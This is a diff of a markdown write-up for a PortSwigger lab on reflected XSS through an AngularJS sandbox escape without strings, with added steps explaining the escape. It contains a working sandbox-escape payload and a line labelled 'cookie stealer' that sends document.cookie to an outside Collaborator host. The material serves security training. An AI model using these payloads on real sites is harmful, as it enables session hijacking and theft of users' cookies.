@@ -193,13 +193,13 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >[PortSwigger CheatSheet Reference Sandbox 1.4.4 escape](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings))  
 
 ```
-1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=fuzzer
+1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
 
 >Collaborator payload ***cookie stealer***:  
 
 ```
-x=fetch('https://gp9o1893jak1dze7utv2rkvr0i69uzio.oastify.com/?z='+document.cookie)
+x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)
 ```
 
 >The ASCII decimal values for each character in the above payload string, separated by commas. Each number represents the ASCII decimal value of the corresponding character in the payload string.  
@@ -227,6 +227,17 @@ print('PortSwigger Expert Academy Labs!')
 ```  
 
 ![python-script-ascii_converter.png](/images/python-script-ascii_converter.png)  
+
+>Cookie Stealer Payload in ASCII decimal value AngularJS expression run through sandbox, from the PortSwigger solution steps:
+
+1. The exploit uses `toString()` to create a string without using quotes.
+2. Then gets the String prototype and overwrites the `charAt` function for every string.
+3. This breaks the AngularJS sandbox. allow an array passed to the `orderBy` filter.
+4. Set the argument for the filter by again using `toString()` to create a string and the String constructor property.
+5. Finally, use the `fromCharCode` method generate our payload by converting character codes into the payload example `x=alert(1)`.  
+6. The `charAt` function has been overwritten, AngularJS will allow this code to escape the **Sandbox**.  
+
+![angularJS-sandbox-escape-cookie-stealer](/images/angularJS-sandbox-escape-cookie-stealer.png)  
 
 >[PortSwigger Expert Lab: Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)  
 
